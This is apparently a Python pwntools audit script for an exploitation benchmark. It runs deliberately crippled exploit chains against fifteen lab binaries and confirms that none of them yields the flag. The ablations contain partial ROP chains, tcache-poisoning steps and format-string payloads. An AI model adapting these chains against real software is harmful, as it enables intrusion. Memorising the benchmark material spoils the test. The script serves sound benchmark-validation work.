#!/usr/bin/env python3
"""Ablation audit: prove every step of a target's intended chain is NECESSARY.

WHY THIS EXISTS, AND WHY IT IS DIFFERENT FROM THE NEGATIVE CONTROLS
-------------------------------------------------------------------
`benchmark/soundness_probes/negative_control_sweep.py` answers "can benign input
get the flag?" -- i.e. is the target *trivially* solvable. That is necessary but
not sufficient. It says nothing about whether the intended chain's steps are
actually load-bearing.

Round 1 shipped two VOID targets because only reachability was ever tested:

  * 13_off_by_one    -- the harness's own injected stdin tripped the off-by-one,
                         so merely running the binary scored SUCCESS.
                         (A negative control DOES catch this one.)
  * 11_heap_uaf_leak -- its display path dumped the flag from a LIVE chunk. The
                         use-after-free the exploit was supposed to perform was
                         never required. No negative control catches this: benign
                         input does not get the flag, and a "working" exploit does.
                         The target simply did not measure the technique it claimed.

An ablation catches the second class. For each target, run the WHOLE chain with
exactly one essential step removed (or substituted with a plausible-but-wrong
value) and require that the flag does NOT appear. If it still appears, the step
was decoration and the target measures something easier than it claims.

Rule of thumb: assert necessity, not just reachability. "The exploit works" is
not evidence a target is sound; "nothing less than the exploit works" is.

This file ablates all 15 corpus_r2 targets (not just the ones with subtle
multi-step logic): for the straightforward stack-overflow targets the removed
step is simply "the overflow itself" (send a short, in-bounds payload); for the
gated/multi-step targets it is the specific gate or ordering the exploit
depends on (a magic argument, a canary leak, a free() before reuse, a PIE base
leak, a %hn write, a count-gate ordering trick, etc).

USAGE
-----
    python3 benchmark/corpus_r2_reference/ablation.py
    python3 benchmark/corpus_r2_reference/ablation.py --corpus-root <dir>
    python3 benchmark/corpus_r2_reference/ablation.py --case 08 --case 15

Paths default to this file's own location, so it runs from a clean checkout
from any working directory. Build the targets first
(`benchmark/build_all_r2.sh`); each case reads the target's current `flag.txt`,
so it works with freshly rotated secrets.

Exit status 0 means every ablation FAILED to produce the flag, which is the
passing result. Exit 1 means some step of some chain is not necessary.

ADAPTED FROM
------------
benchmark/corpus_r4_reference/ablation.py (branch
feat/benchmark-corpus-r4-20260923, commit 9868b75). The harness, CLI, and
framing are reused verbatim; every driver body below is rewritten against
this round's own targets' actual input/menu structure -- ablation cases are
inherently per-target and do not transfer mechanically.
"""
import argparse
import os
import sys

from pwn import ELF, context, p32, p64, process

context.log_level = "error"
context.arch = "amd64"

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CORPUS = os.path.join(os.path.dirname(HERE), "corpus_r2")


# ---------------------------------------------------------------- 01
# Shellcode relay. A short, non-overflowing payload never reaches the saved
# return address, so no shell is ever obtained and "cat flag.txt" (sent
# afterward, to a process that never gave us a shell) goes nowhere.

def _drive_01_no_overflow(io, elf):
    io.recvuntil(b"shellcode> ")
    io.send(b"hi\n")
    io.sendline(b"cat flag.txt")


# ---------------------------------------------------------------- 02
# ret2plt system(). Benign cmd input never reaches the return address, so
# system() is never called with sh_buf and no shell is obtained.

def _drive_02_no_overflow(io, elf):
    io.recvuntil(b"name: ")
    io.sendline(b"hi")
    io.recvuntil(b"cmd> ")
    io.sendline(b"hi")
    io.sendline(b"cat flag.txt")


# ---------------------------------------------------------------- 03
# PIE self-leak -> ret2libc. Round 1 (the leak) is driven honestly so the
# protocol stays in sync, but round 2 deliberately IGNORES the leaked base
# and calls system() at a wrong, unleaked address -- proving the leak, not
# just an overflow, is what the chain depends on.

def _drive_03_wrong_libc_base(io, elf):
    OFFSET_TO_RETADDR = 88
    io.recvline()
    self_leak = io.recvn(8)
    io.recvline()
    from pwn import u64
    base = u64(self_leak) - elf.symbols["vuln"]
    pop_rdi = base + elf.symbols["pop_rdi_gadget"]
    pop_rsi_rdx = base + elf.symbols["pop_rsi_rdx_gadget"]
    write_plt = base + elf.plt["write"]
    puts_got = base + elf.got["puts"]
    vuln_addr = base + elf.symbols["vuln"]

    payload1 = b"A" * OFFSET_TO_RETADDR
    payload1 += p64(pop_rdi) + p64(1)
    payload1 += p64(pop_rsi_rdx) + p64(puts_got) + p64(8)
    payload1 += p64(write_plt)
    payload1 += p64(vuln_addr)
    io.send(payload1)

    io.recvn(8)  # puts leak (deliberately unused below)
    io.recvn(8)  # round-2 self-leak (unused)
    io.recvline()

    # Wrong, unleaked "system" target -- the leak was skipped in spirit.
    bogus_system = 0x4141414141414141
    binsh_addr = base + elf.symbols["vuln"]  # any address; call target is what matters

    payload2 = b"A" * OFFSET_TO_RETADDR
    payload2 += p64(pop_rdi) + p64(binsh_addr)
    payload2 += p64(bogus_system)
    io.send(payload2)
    io.sendline(b"cat flag.txt")


# ---------------------------------------------------------------- 04
# Canary-gated overflow. Guessing canary=0 instead of relaying the real leak
# trips __stack_chk_fail before the return address is ever reached.

def _drive_04_wrong_canary(io, elf):
    io.recvuntil(b"Name: ")
    io.send(b"A" * 64)
    io.recvuntil(b"Relay: ")
    io.recvn(8)  # real canary, deliberately discarded
    io.recvuntil(b"Message: ")
    ret_fixer = elf.symbols["win"] + (0x4013c3 - 0x40138d)
    payload = b"B" * 64 + b"G" * 8 + b"\x00" * 8 + b"R" * 8
    payload += p64(ret_fixer) + p64(elf.symbols["win"])
    io.send(payload)


# ---------------------------------------------------------------- 05
# PIE fmtstr leak. Skipping the %N$p leak and guessing base=0 sends win()'s
# address as its raw ELF-file offset, nowhere near the real runtime mapping.

def _drive_05_no_leak(io, elf):
    io.recvuntil(b"name: ")
    io.sendline(b"benign name, no %p leak")
    io.recvuntil(b"buf: ")
    ret_fixer = 0x1320  # base=0 (wrong)
    win_addr = elf.symbols["win"]  # base=0 (wrong)
    payload = b"A" * 232 + p64(ret_fixer) + p64(win_addr)
    io.sendline(payload)


# ---------------------------------------------------------------- 06
# fmtstr %hn gate. A read-only format string (no %hn directive) never
# writes AUTH_MAGIC into auth_level, so the gate stays closed.

def _drive_06_no_write(io, elf):
    io.recvuntil(b"msg: ")
    io.sendline(b"%1$p %2$p %3$p just reading, no %hn here")


# ---------------------------------------------------------------- 07
# static ret2syscall. Benign input never builds the execve() chain, so no
# shell is obtained.

def _drive_07_no_overflow(io, elf):
    io.recvuntil(b"input> ")
    io.sendline(b"hi")
    io.sendline(b"cat flag.txt")


# ---------------------------------------------------------------- 08
# Integer/size-arithmetic overflow. An honest small record count (no
# truncation trick) never corrupts the loop's own control variables, so the
# return address is never reached.

def _drive_08_honest_count(io, elf):
    io.recvuntil(b"records (0-8, 8 bytes each): ")
    io.sendline(b"3")
    io.recvuntil(b"loading 3 records...\n")
    io.send(b"C" * 24)  # exactly 3*8 bytes, well within buf


# ---------------------------------------------------------------- 09
# Dangling-global UAF read. Without free_note(), check_license()'s malloc()
# gets a DIFFERENT, freshly-obtained chunk (no reuse), so note_ptr keeps
# pointing at its own live 'A' placeholder rather than the license token.

def _menu(io, choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def _drive_09_no_free(io, elf):
    _menu(io, 1)  # alloc_note(): placeholder
    io.recvline()
    _menu(io, 4)  # check_license(): allocates its OWN chunk (no reuse -- never freed)
    io.recvline()
    _menu(io, 3)  # show_note(): still reads the live placeholder, not the token


# ---------------------------------------------------------------- 10
# ret2csu argument gate. Calling win() with the wrong magic value hits the
# "wrong magic" branch instead of printing the flag.

def _drive_10_wrong_magic(io, elf):
    OFFSET_TO_RETADDR = 88
    csu_gadget = elf.symbols["csu_gadget"]
    csu_gadget_call = elf.symbols["csu_gadget_call"]
    win_ptr = elf.symbols["win_ptr"]
    ret_fixer = elf.symbols["win"] + (0x4012f1 - 0x4012be)

    io.recvuntil(b"input> ")
    payload = b"A" * OFFSET_TO_RETADDR
    payload += p64(ret_fixer)
    payload += p64(csu_gadget)
    payload += p64(0) + p64(0) + p64(0) + p64(0)
    payload += p64(0xDEADBEEF)  # WRONG magic (real is 0xCAFEBABE)
    payload += p64(win_ptr)
    payload += p64(csu_gadget_call)
    payload += p64(0) + p64(0) * 6 + p64(0)
    io.send(payload)


# ---------------------------------------------------------------- 11
# Heap tcache poison. This is the exact 2-chunk (no count-gate filler)
# sequence that was empirically tried FIRST while developing the reference
# exploit and found NOT to work (see 11_..._reference.py's docstring):
# freeing only B and poisoning it directly still passes the count>0 check
# on the pop that would need to return the poisoned value, but that same
# pop is what drops count to 0 -- so the following malloc() never takes the
# tcache fast path and dispatch_table is never actually reached.

def _protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr


def _create(io, idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.recvuntil(f"chunk[{idx}] @ ".encode())
    addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"ok\n")
    return addr


def _fill(io, idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendlineafter(b"data: ", data)
    io.recvuntil(b"ok\n")


def _delete(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"ok\n")


def _call_handler(io, idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())


def _drive_11_no_count_gate(io, elf):
    dispatch_table = elf.symbols["dispatch_table"]
    win_addr = elf.symbols["win"]

    mem_a = _create(io, 0, 0x18)
    mem_b = _create(io, 1, 0x18)
    _delete(io, 1)  # count=1, no filler chunk freed first (the missing step)

    poison = _protect_ptr(mem_b, dispatch_table)
    payload = b"A" * 0x18 + p64(0x21) + p64(poison)
    _fill(io, 0, payload)

    _create(io, 2, 0x18)  # pops B; count now 0 -- entries[idx] set but unreachable
    _create(io, 3, 0x18)  # NOT dispatch_table: falls through to a fresh heap chunk

    _fill(io, 3, p64(win_addr))  # lands in ordinary heap memory, not dispatch_table
    _call_handler(io, 0)  # dispatch_table[0] is still noop


# ---------------------------------------------------------------- 12
# fmtstr GOT overwrite. A read-only format string (no %hn writes) leaves
# puts@got pointing at the real puts(), so "post-leak checkpoint" prints
# normally instead of calling win().

def _drive_12_no_write(io, elf):
    io.recvuntil(b"msg: ")
    io.sendline(b"%1$p.%2$p.%3$p (read-only, no %hn)")


# ---------------------------------------------------------------- 13
# Off-by-one LSB overwrite. Exactly sizeof(buf) bytes (64) never reaches the
# fencepost byte, so s.cb keeps its original safe_path value.

def _drive_13_exact_bound(io, elf):
    io.recvuntil(b"data (no newline): ")
    io.send(b"A" * 64 + b"\n")  # newline terminates at n=64, s.cb untouched


# ---------------------------------------------------------------- 14
# OOB read. Only ever querying in-bounds indices (0..7) stays inside `arr`
# and never touches `secret`.

def _drive_14_in_bounds_only(io, elf):
    for idx in range(8):
        io.recvuntil(b"index: ")
        io.sendline(str(idx).encode())
        io.recvline()
    io.recvuntil(b"index: ")
    io.sendline(b"-1")


# ---------------------------------------------------------------- 15
# ret2win argument gate. Overwriting the return address directly with
# win() (skipping pop_rdi_gadget) leaves rdi as whatever garbage the ABI
# happens to hold, which will essentially never equal WIN_MAGIC.

def _drive_15_no_gadget(io, elf):
    io.recvuntil(b"data> ")
    ret_fixer = elf.symbols["pop_rdi_gadget"] + 5
    payload = b"A" * 56 + p64(ret_fixer) + p64(elf.symbols["win"])
    io.send(payload)


# Each case: (target dir, label, body). `body(io, elf)` drives one session; the
# flag must NOT appear in its output.
CASES = [
    ("01_stack_shellcode_relay", "no overflow (benign shellcode input)",
     _drive_01_no_overflow),
    ("02_ret2plt_strcat_system", "no overflow (benign cmd input)",
     _drive_02_no_overflow),
    ("03_pie_write_leak_ret2libc", "leak performed but ignored (wrong system target)",
     _drive_03_wrong_libc_base),
    ("04_canary_relay_bypass", "wrong canary (guessed zero, not the real leak)",
     _drive_04_wrong_canary),
    ("05_fmtstr_pie_leak", "no PIE leak (base guessed as 0)",
     _drive_05_no_leak),
    ("06_fmtstr_short_write", "read-only format string (no %hn write)",
     _drive_06_no_write),
    ("07_static_ret2syscall", "no overflow (benign input)",
     _drive_07_no_overflow),
    ("08_int_mul_overflow", "honest count (no truncation trick)",
     _drive_08_honest_count),
    ("09_heap_dangling_global", "minus free_note() (no chunk reuse to alias)",
     _drive_09_no_free),
    ("10_ret2csu_execve", "wrong magic argument",
     _drive_10_wrong_magic),
    ("11_heap_overflow_tcache_poison", "minus count-gate filler chunk (poison unreachable)",
     _drive_11_no_count_gate),
    ("12_fmtstr_got_overwrite", "read-only format string (no %hn write)",
     _drive_12_no_write),
    ("13_off_by_one_retaddr_lsb", "exactly sizeof(buf) bytes (fencepost not crossed)",
     _drive_13_exact_bound),
    ("14_oob_read_flag_array", "in-bounds indices only (0..7)",
     _drive_14_in_bounds_only),
    ("15_ret2win_arg_gate", "no pop_rdi gadget (magic argument left to chance)",
     _drive_15_no_gadget),
]


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--corpus-root", default=DEFAULT_CORPUS,
                    help="corpus directory (default: %(default)s)")
    ap.add_argument("--case", action="append", default=[], metavar="PREFIX",
                    help="only run cases whose target starts with PREFIX "
                         "(repeatable, e.g. --case 08)")
    ap.add_argument("--timeout", type=float, default=4.0,
                    help="per-session read timeout in seconds")
    args = ap.parse_args()

    root = os.path.abspath(args.corpus_root)
    if not os.path.isdir(root):
        print(f"error: corpus root not found: {root}", file=sys.stderr)
        return 2

    cases = CASES
    if args.case:
        cases = [c for c in cases if any(c[0].startswith(p) for p in args.case)]
        if not cases:
            print(f"error: no cases matched {args.case}", file=sys.stderr)
            return 2

    cache: dict = {}
    leaks = 0
    for target, label, body in cases:
        if target not in cache:
            tdir = os.path.join(root, target)
            binary = os.path.join(tdir, target.split("_", 1)[1])
            flag_file = os.path.join(tdir, "flag.txt")
            if not os.path.isfile(binary):
                print(f"error: {binary} not built -- run benchmark/build_all_r2.sh",
                      file=sys.stderr)
                return 2
            if not os.path.isfile(flag_file):
                print(f"error: {flag_file} missing -- run benchmark/build_all_r2.sh",
                      file=sys.stderr)
                return 2
            with open(flag_file) as fh:
                cache[target] = (binary, fh.read().strip())
        binary, flag = cache[target]
        elf = ELF(binary, checksec=False)

        io = process(binary, cwd=os.path.dirname(binary))
        try:
            body(io, elf)
            out = io.recvall(timeout=args.timeout).decode(errors="replace")
        except EOFError:
            out = ""
        finally:
            io.close()

        leaked = flag in out
        leaks += leaked
        print(("LEAK!   " if leaked else "no-flag ") + f"{target}  {label}")

    print(f"\n{len(cases)} ablations, {leaks} produced the flag")
    if leaks:
        print("FAIL: a chain step is not necessary -- that target measures "
              "something easier than it claims.", file=sys.stderr)
    return 1 if leaks else 0


if __name__ == "__main__":
    sys.exit(main())
